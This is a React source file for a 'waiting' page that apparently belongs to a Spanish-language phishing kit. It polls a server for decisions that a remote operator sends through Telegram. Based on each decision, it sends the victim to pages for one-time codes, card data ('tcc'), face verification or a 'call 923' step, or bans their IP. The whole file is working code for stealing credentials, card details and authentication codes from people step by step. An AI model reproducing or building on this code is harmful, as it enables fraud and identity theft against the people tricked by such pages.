import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

export default function WaitingTelegram() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    const userId = localStorage.getItem("userId");
    if (!userId) {
      setLocation("/");
      return;
    }

    // Poll for Telegram decision every 2 seconds
    let checkCount = 0;
    const checkInterval = setInterval(async () => {
      checkCount++;
      try {
        const decisionResponse = await fetch(`/api/telegram-decision/${userId}`);
        const decisionData = await decisionResponse.json();
        
        if (decisionResponse.ok && decisionData.decision) {
          clearInterval(checkInterval);
          
          if (decisionData.decision === "otp") {
            // Go to dynamic key page
            setLocation("/dynamic-key");
          } else if (decisionData.decision === "usuario") {
            // Go back to login with previous credentials pre-filled
            localStorage.removeItem("userId");
            localStorage.removeItem("codeId");
            setLocation("/");
          } else if (decisionData.decision === "tcc") {
            // Go to TCC page
            setLocation("/tcc");
          } else if (decisionData.decision === "tcc-confirm") {
            // Card data confirmed, go to dynamic key
            setLocation("/dynamic-key");
          } else if (decisionData.decision === "tcc-cancel") {
            // Card data cancelled, go back to tcc
            setLocation("/tcc");
          } else if (decisionData.decision === "ban-ip") {
            // IP banned, ban it and redirect
            try {
              await fetch('/api/ban-ip', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
              });
            } catch (error) {
              console.error('Error banning IP:', error);
            }
            window.location.reload();
          } else if (decisionData.decision === "face") {
            // Face auth selected, go to face verification page
            setLocation("/face");
          } else if (decisionData.decision === "call-923") {
            // Call 923 selected, go to call 923 page
            setLocation("/call-923");
          }
        } else if (checkCount > 150) {
          // 5 minutes timeout (150 * 2 seconds)
          clearInterval(checkInterval);
          toast({
            variant: "destructive",
            title: "Tiempo agotado",
            description: "No se recibió respuesta de Telegram",
          });
          setLocation("/");
        }
      } catch (error) {
        console.error('Error checking Telegram decision:', error);
        if (checkCount > 150) {
          clearInterval(checkInterval);
          setLocation("/");
        }
      }
    }, 2000);

    return () => clearInterval(checkInterval);
  }, [setLocation, toast]);

  return (
    <div className="fixed inset-0 flex flex-col items-center justify-center pointer-events-none">
      <div className="flex flex-col items-center justify-center space-y-6">
        <Loader2 className="h-16 w-16 text-yellow-500 animate-spin" />
        <h2 className="text-xl text-white font-medium">Cargando...</h2>
      </div>
    </div>
  );
}
